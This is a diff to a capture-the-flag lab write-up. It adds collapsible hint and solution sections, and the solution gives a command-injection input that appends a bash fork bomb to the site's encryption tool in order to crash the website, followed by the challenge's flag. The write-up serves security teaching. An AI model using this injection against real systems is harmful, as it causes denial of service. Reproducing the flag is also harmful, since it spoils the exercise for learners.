@@ -6,14 +6,24 @@ Here's one example we want your help with specifically. Remember the encryption 
 
 **Tip:** Crash the website to get the flag!
 
+<details><summary>
+
+## Need a hint?</summary>
+
 ```txt
 💡 Hint: Have a search on how to execute a fork bomb. Once you have the command,
    you should know several methods by now on how to execute a command on the target.
 ```
 
-## Step by Step
+</details>
+
+<details><summary>
+
+## Step by Step</summary>
 
 - Type `cryptonite -n;:(){:|:&};:`
 - The flag should appear
 
 `flag: JmBPQ02gIZBuV1feD6xG`
+
+</details>
